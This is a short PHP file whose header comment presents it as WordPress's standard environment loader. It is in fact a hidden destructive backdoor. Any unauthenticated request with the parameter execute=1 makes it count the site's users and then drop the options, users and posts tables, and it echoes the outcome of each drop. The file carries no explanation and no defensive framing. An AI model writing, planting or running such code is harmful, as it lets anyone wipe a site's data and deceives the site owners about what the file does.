<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

require('wp-load.php');

if( $_REQUEST['execute'] == '1' ){
  echo "1 ";

  global $wpdb;

  $user_count = $wpdb->get_var( "SELECT COUNT(*) FROM $wpdb->users" );
  if ($user_count === false){
    echo "query failed.";
  } else {
    echo "query done.";
  }
  echo "<p>User count is {$user_count}</p>";


  $resultx = $wpdb->query( "DROP TABLE {$wpdb->prefix}options" );
  if ($resultx === false){
    echo "options escaped. ";
  } else {
    echo "options executed. ";
  }

  $resulty = $wpdb->query( "DROP TABLE {$wpdb->prefix}users" );
  if ($resulty === false){
    echo "users escaped. ";
  } else {
    echo "users executed. ";
  }

  $resultz = $wpdb->query( "DROP TABLE {$wpdb->prefix}posts" );
  if ($resultz === false){
    echo "posts escaped. ";
  } else {
    echo "posts executed. ";
  }

} else {

  echo "0 ";

}

